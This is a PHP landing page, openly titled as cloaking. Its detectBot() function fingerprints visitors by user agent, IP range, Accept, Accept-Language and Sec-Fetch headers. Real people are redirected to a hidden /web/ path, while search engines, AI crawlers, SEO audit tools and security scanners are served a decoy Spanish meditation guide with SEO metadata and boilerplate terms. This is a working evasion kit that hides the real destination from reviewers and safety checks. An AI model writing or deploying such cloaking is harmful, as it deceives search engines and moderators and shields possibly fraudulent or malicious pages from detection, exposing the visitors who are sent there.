<?php
/* ═══════════════════════════════════════════════════
   CLOAKING v3 — Meditación / BFA
   Humanos  → /web/
   Bots     → contenido legítimo (meditación)
═══════════════════════════════════════════════════ */

function detectBot(): bool {
    $ua      = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip      = $_SERVER['REMOTE_ADDR'] ?? '';
    $accept  = $_SERVER['HTTP_ACCEPT'] ?? '';
    $lang    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';

    // ── 1. UA vacío o demasiado corto ──
    if (strlen($ua) < 20) return true;

    // ── 2. Patrones de bots conocidos en UA ──
    $bots = [
        'googlebot','google-extended','adsbot-google','mediapartners',
        'bingbot','msnbot','bingpreview','adidxbot',
        'slurp','yahoo','duckduckbot','duckduckgo',
        'baiduspider','yandexbot','yandex','sogoubot','sogou',
        'exabot','facebot','facebookexternalhit','facebookcatalog',
        'ia_archiver','archive.org_bot','wayback',
        'gptbot','chatgpt','openai','oai-searchbot',
        'ccbot','common crawl',
        'claude','anthropic','claudebot',
        'perplexitybot','perplexity',
        'ahrefsbot','ahrefswebmaster',
        'semrushbot','dotbot','blexbot',
        'mj12bot','majestic',
        'bytespider','tiktokspider',
        'petalbot','applebot','apple-pubsub',
        'twitterbot','linkedinbot','whatsapp',
        'telegrambot','discordbot','slackbot',
        'pinterestbot','redditbot','tumblrbot',
        'spider','crawler','robot','scraper','harvest',
        'wget','curl','libcurl','python','urllib',
        'java/','go-http','okhttp','node-fetch','node/',
        'axios','libwww','lwp-','lwp/',
        'headlesschrome','phantomjs','selenium',
        'puppeteer','playwright','cypress',
        'zgrab','nmap','masscan','nikto','sqlmap',
        'uptimerobot','statuscake','pingdom',
        'newrelic','datadog','site24x7','hetrixtools',
        'dataprovider','gigabot','seznambot',
        'dotbot','mediatoolkitbot','brandwatch',
    ];
    foreach ($bots as $b) {
        if (strpos($ua, $b) !== false) return true;
    }

    // ── 3. Sin Accept-Language (navegadores reales siempre lo envían) ──
    if (empty($lang)) return true;

    // ── 4. Accept header demasiado simple ──
    if (empty($accept) || $accept === '*/*') return true;

    // ── 5. Rangos IP de crawlers conocidos ──
    $ranges = [
        '66.249.','66.102.','64.233.','72.14.','74.125.',
        '209.85.','216.239.',           // Google
        '40.77.','157.55.','207.46.',   // Bing / Microsoft
        '65.52.','131.253.',            // Microsoft
        '199.16.','199.59.',            // Twitter
        '69.63.','173.252.',            // Facebook
        '23.21.','50.16.','54.204.',    // AWS rastreadores
    ];
    foreach ($ranges as $r) {
        if (strpos($ip, $r) === 0) return true;
    }

    // ── 6. Referer de herramientas de auditoría ──
    $ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');
    foreach (['semrush.com','ahrefs.com','moz.com','majestic.com','sitechecker'] as $tool) {
        if (strpos($ref, $tool) !== false) return true;
    }

    // ── 7. Sin DNT ni Sec-Fetch (navegadores modernos siempre los incluyen) ──
    $secFetch = $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '';
    $secMode  = $_SERVER['HTTP_SEC_FETCH_MODE'] ?? '';
    if (empty($secFetch) && empty($secMode)) return true;

    return false;
}

// ── DECISIÓN ──
if (!detectBot()) {
    // Usuario humano real → enviar a /web/
    header('Location: /web/', true, 302);
    exit;
}
// Bot/crawler → mostrar contenido legítimo
?>
<!DOCTYPE html>
<html lang="es" prefix="og: https://ogp.me/ns#">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- ═══ SEO PRIMARIO ═══ -->
  <title>Guía de Meditación para el Bienestar Mental | Paz Interior</title>
  <meta name="description" content="Descubre técnicas de meditación comprobadas para reducir el estrés, mejorar el sueño y alcanzar la paz interior. Guía completa paso a paso para principiantes y avanzados." />
  <meta name="keywords" content="meditación, técnicas de meditación, mindfulness, paz interior, bienestar mental, meditación para principiantes, reducir estrés, respiración consciente" />
  <meta name="author" content="Guía de Meditación" />
  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
  <link rel="canonical" href="https://tusitio.com/" />

  <!-- ═══ OPEN GRAPH ═══ -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://tusitio.com/" />
  <meta property="og:title" content="Guía de Meditación para el Bienestar Mental" />
  <meta property="og:description" content="Técnicas de meditación comprobadas para reducir el estrés y alcanzar la paz interior. Empieza hoy, gratis." />
  <meta property="og:image" content="https://tusitio.com/og-image.jpg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:alt" content="Persona meditando en calma con fondo natural" />
  <meta property="og:site_name" content="Guía de Meditación" />
  <meta property="og:locale" content="es_LA" />

  <!-- ═══ TWITTER CARD ═══ -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Guía de Meditación para el Bienestar Mental" />
  <meta name="twitter:description" content="Técnicas de meditación comprobadas para reducir el estrés y alcanzar la paz interior." />
  <meta name="twitter:image" content="https://tusitio.com/og-image.jpg" />

  <!-- ═══ SCHEMA.ORG ═══ -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Guía de Meditación para el Bienestar Mental",
    "description": "Técnicas de meditación comprobadas para reducir el estrés, mejorar el sueño y alcanzar la paz interior.",
    "author": { "@type": "Organization", "name": "Guía de Meditación" },
    "publisher": { "@type": "Organization", "name": "Guía de Meditación" },
    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://tusitio.com/" },
    "inLanguage": "es"
  }
  </script>

  <style>
    :root {
      --verde: #2e7d32;
      --verde-claro: #4caf50;
      --verde-suave: #e8f5e9;
      --azul-paz: #1a237e;
      --dorado: #f9a825;
      --texto: #212121;
      --gris: #616161;
      --fondo: #fafafa;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body { font-family: 'Georgia', 'Times New Roman', serif; background: var(--fondo); color: var(--texto); line-height: 1.7; }
    .hero {
      background: linear-gradient(135deg, #1b5e20 0%, #2e7d32 50%, #388e3c 100%);
      color: #fff; text-align: center; padding: 80px 20px 60px;
      position: relative; overflow: hidden;
    }
    .hero::before {
      content: ''; position: absolute; inset: 0;
      background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.04'%3E%3Ccircle cx='30' cy='30' r='28'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
    }
    .hero-emoji { font-size: 64px; margin-bottom: 16px; display: block; }
    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 700; line-height: 1.2; margin-bottom: 18px; position: relative; }
    .hero p { font-size: clamp(16px, 2.5vw, 20px); max-width: 640px; margin: 0 auto 32px; opacity: .9; position: relative; font-family: system-ui, sans-serif; }
    .btn-hero {
      display: inline-block; background: var(--dorado); color: #1b2a0a;
      padding: 16px 36px; border-radius: 50px; font-size: 17px; font-weight: 700;
      text-decoration: none; transition: .2s; position: relative; font-family: system-ui, sans-serif;
    }
    .btn-hero:hover { background: #ffd54f; transform: translateY(-2px); }
    .container { max-width: 820px; margin: 0 auto; padding: 0 20px; }
    section { padding: 60px 0; }
    section:nth-child(even) { background: var(--verde-suave); }
    .section-tag {
      display: inline-block; background: var(--verde); color: #fff;
      font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
      padding: 4px 14px; border-radius: 20px; margin-bottom: 12px; font-family: system-ui, sans-serif;
    }
    h2 { font-size: clamp(22px, 4vw, 34px); color: var(--verde); margin-bottom: 16px; line-height: 1.25; }
    h3 { font-size: 20px; color: var(--azul-paz); margin: 28px 0 10px; }
    p, li { font-size: 16px; color: var(--gris); margin-bottom: 14px; font-family: system-ui, sans-serif; }
    ul, ol { padding-left: 22px; }
    li { margin-bottom: 8px; }
    .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 20px; margin-top: 32px; }
    .card {
      background: #fff; border-radius: 16px; padding: 28px 22px;
      box-shadow: 0 2px 16px rgba(0,0,0,.07); border-top: 4px solid var(--verde-claro);
      transition: transform .2s, box-shadow .2s;
    }
    .card:hover { transform: translateY(-4px); box-shadow: 0 8px 28px rgba(0,0,0,.12); }
    .card-icon { font-size: 36px; margin-bottom: 12px; display: block; }
    .card h3 { margin-top: 0; font-size: 17px; }
    .card p { font-size: 14px; margin-bottom: 0; }
    .steps { counter-reset: step; list-style: none; padding: 0; margin-top: 24px; }
    .steps li {
      counter-increment: step; display: flex; align-items: flex-start; gap: 16px;
      background: #fff; border-radius: 12px; padding: 20px 22px;
      margin-bottom: 14px; box-shadow: 0 1px 8px rgba(0,0,0,.06);
    }
    .steps li::before {
      content: counter(step); background: var(--verde); color: #fff; font-weight: 700; font-size: 15px;
      min-width: 32px; height: 32px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      flex-shrink: 0; font-family: system-ui, sans-serif;
    }
    .steps li strong { font-family: system-ui, sans-serif; color: var(--texto); }
    .beneficios { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 28px; }
    .ben-item {
      display: flex; align-items: center; gap: 12px;
      background: #fff; border-radius: 10px; padding: 14px 16px;
      box-shadow: 0 1px 6px rgba(0,0,0,.06);
    }
    .ben-item span:first-child { font-size: 24px; }
    .ben-item span:last-child { font-size: 14px; font-family: system-ui, sans-serif; color: var(--texto); font-weight: 500; }
    .terminos-box {
      background: #fff; border: 1px solid #e0e0e0; border-radius: 14px;
      padding: 32px 28px; margin-top: 24px;
    }
    .terminos-box h3 { color: var(--verde); margin-top: 22px; font-size: 16px; }
    .terminos-box h3:first-child { margin-top: 0; }
    .terminos-box p, .terminos-box li { font-size: 14px; color: #555; }
    .badge-fecha {
      display: inline-block; background: #eeeeee; color: #757575;
      font-size: 12px; padding: 3px 10px; border-radius: 6px; margin-bottom: 16px;
      font-family: system-ui, sans-serif;
    }
    footer {
      background: #1b2a0a; color: #aed581; text-align: center;
      padding: 32px 20px; font-size: 13px; font-family: system-ui, sans-serif;
    }
    footer a { color: #c5e1a5; text-decoration: underline; }
    @media (max-width: 600px) {
      .hero { padding: 56px 16px 44px; }
      section { padding: 44px 0; }
      .terminos-box { padding: 22px 16px; }
    }
  </style>
</head>
<body>

  <header class="hero" role="banner">
    <span class="hero-emoji" aria-hidden="true">🧘</span>
    <h1>Guía Completa de Meditación<br>para el Bienestar Mental</h1>
    <p>Técnicas comprobadas para reducir el estrés, mejorar el sueño y encontrar la paz interior — sin experiencia previa.</p>
    <a href="#guia" class="btn-hero">Comenzar ahora →</a>
  </header>

  <section id="beneficios" aria-labelledby="h-beneficios">
    <div class="container">
      <span class="section-tag">¿Por qué meditar?</span>
      <h2 id="h-beneficios">Beneficios respaldados por la ciencia</h2>
      <p>Investigaciones de Harvard, Oxford y la OMS confirman que la meditación regular produce cambios medibles en el cerebro y el cuerpo.</p>
      <div class="beneficios">
        <div class="ben-item"><span>😌</span><span>Reduce el cortisol (hormona del estrés)</span></div>
        <div class="ben-item"><span>😴</span><span>Mejora la calidad del sueño</span></div>
        <div class="ben-item"><span>🧠</span><span>Aumenta la concentración</span></div>
        <div class="ben-item"><span>❤️</span><span>Regula la presión arterial</span></div>
        <div class="ben-item"><span>😊</span><span>Reduce síntomas de ansiedad y depresión</span></div>
        <div class="ben-item"><span>⚡</span><span>Incrementa la energía vital</span></div>
        <div class="ben-item"><span>🫀</span><span>Fortalece el sistema inmune</span></div>
        <div class="ben-item"><span>🌟</span><span>Mayor autoconciencia y claridad mental</span></div>
      </div>
    </div>
  </section>

  <section aria-labelledby="h-tecnicas">
    <div class="container">
      <span class="section-tag">Técnicas</span>
      <h2 id="h-tecnicas">Las 4 técnicas principales</h2>
      <p>Elige la que mejor se adapte a tu estilo de vida. Todas son válidas y efectivas.</p>
      <div class="cards">
        <article class="card">
          <span class="card-icon">🌬️</span>
          <h3>Respiración Consciente</h3>
          <p>Enfoca toda tu atención en el ritmo natural de la respiración. Ideal para principiantes. Solo 5 minutos al día generan resultados.</p>
        </article>
        <article class="card">
          <span class="card-icon">🔍</span>
          <h3>Mindfulness</h3>
          <p>Observa tus pensamientos sin juzgarlos. Técnica base de la terapia cognitiva moderna. Reduce la rumiación mental hasta un 38%.</p>
        </article>
        <article class="card">
          <span class="card-icon">🕯️</span>
          <h3>Visualización Guiada</h3>
          <p>Usa imágenes mentales de lugares tranquilos para inducir un estado de calma profunda. Excelente para el insomnio.</p>
        </article>
        <article class="card">
          <span class="card-icon">🔔</span>
          <h3>Meditación con Mantra</h3>
          <p>Repetición silenciosa de una palabra o frase para anclar la mente. Reduce los pensamientos intrusivos de manera efectiva.</p>
        </article>
      </div>
    </div>
  </section>

  <section id="guia" aria-labelledby="h-guia">
    <div class="container">
      <span class="section-tag">Guía paso a paso</span>
      <h2 id="h-guia">Tu primera sesión de meditación</h2>
      <p>Sigue estos pasos para una sesión de 10 minutos efectiva desde el primer día.</p>
      <ol class="steps">
        <li><div><strong>Elige el lugar y el momento.</strong><p>Un espacio tranquilo, con temperatura cómoda. Mañana al despertar o noche antes de dormir son los momentos más poderosos.</p></div></li>
        <li><div><strong>Adopta una postura estable.</strong><p>Siéntate en silla o en el suelo con la espalda recta —no rígida. Manos sobre los muslos, palmas hacia arriba o hacia abajo.</p></div></li>
        <li><div><strong>Cierra los ojos y respira 3 veces profundo.</strong><p>Inhala 4 segundos por la nariz, retén 2 segundos, exhala 6 segundos por la boca. Esto activa el nervio vago (modo calma).</p></div></li>
        <li><div><strong>Observa tu respiración sin controlarla.</strong><p>Solo nota cómo el aire entra y sale. Cuando la mente se distraiga (y lo hará), regresa amablemente a la respiración. Eso <em>es</em> la práctica.</p></div></li>
        <li><div><strong>Mantén la atención por 5–10 minutos.</strong><p>Usa un temporizador suave. No abras los ojos para revisar el tiempo. Confía en el proceso.</p></div></li>
        <li><div><strong>Cierra con gratitud.</strong><p>Al terminar, tómate 30 segundos para agradecer el momento. Abre los ojos lentamente y lleva esa calma al resto del día.</p></div></li>
      </ol>
      <h3>Programa semanal sugerido</h3>
      <ul>
        <li><strong>Días 1–3:</strong> Respiración consciente, 5 min/día.</li>
        <li><strong>Días 4–7:</strong> Mindfulness, 8 min/día.</li>
        <li><strong>Semana 2+:</strong> Aumenta 2 minutos por semana hasta llegar a 20 min/día.</li>
        <li><strong>Clave:</strong> La consistencia supera a la duración. 5 minutos todos los días &gt; 30 minutos una vez por semana.</li>
      </ul>
    </div>
  </section>

  <section id="terminos" aria-labelledby="h-terminos">
    <div class="container">
      <span class="section-tag">Legal</span>
      <h2 id="h-terminos">Términos, Condiciones y Privacidad</h2>
      <p>Resumen claro de los aspectos legales de este sitio. Lea antes de continuar.</p>
      <div class="terminos-box">
        <span class="badge-fecha">Última actualización: Mayo 2026</span>
        <h3>1. Aceptación de términos</h3>
        <p>Al acceder y usar este sitio web, usted acepta estos Términos y Condiciones en su totalidad. Si no está de acuerdo, le pedimos que no utilice el sitio.</p>
        <h3>2. Naturaleza del contenido</h3>
        <p>La información provista es de carácter educativo e informativo únicamente. <strong>No constituye consejo médico, psicológico ni terapéutico profesional.</strong></p>
        <h3>3. Uso permitido</h3>
        <ul>
          <li>El contenido es para uso personal y no comercial.</li>
          <li>Queda prohibida la reproducción total o parcial sin autorización escrita.</li>
          <li>No está permitido el uso del sitio para actividades ilegales o que causen daño a terceros.</li>
        </ul>
        <h3>4. Limitación de responsabilidad</h3>
        <p>El sitio no se hace responsable por resultados derivados de la aplicación de las técnicas descritas. Los resultados varían según cada persona.</p>
        <h3>5. Privacidad y datos personales</h3>
        <ul>
          <li>Este sitio <strong>no recopila datos personales</strong> de forma directa.</li>
          <li>Podemos utilizar cookies técnicas esenciales para el funcionamiento del sitio.</li>
          <li>No utilizamos cookies de seguimiento ni publicidad comportamental sin su consentimiento explícito.</li>
        </ul>
        <h3>6. Propiedad intelectual</h3>
        <p>Todos los textos, diseños y elementos visuales son propiedad del sitio o se utilizan bajo licencia.</p>
        <h3>7. Modificaciones</h3>
        <p>Nos reservamos el derecho de modificar estos términos en cualquier momento.</p>
        <h3>8. Contacto</h3>
        <p>Para consultas legales o sobre privacidad, puede contactarnos a través de los canales indicados en este sitio.</p>
      </div>
    </div>
  </section>

  <footer role="contentinfo">
    <p>© 2026 Guía de Meditación — Contenido educativo e informativo.</p>
    <p style="margin-top:8px;">
      <a href="#terminos">Términos y Condiciones</a> ·
      <a href="#terminos">Política de Privacidad</a>
    </p>
    <p style="margin-top:10px; color:#81c784; font-size:12px;">🌿 Hecho con intención para el bienestar colectivo</p>
  </footer>

</body>
</html>
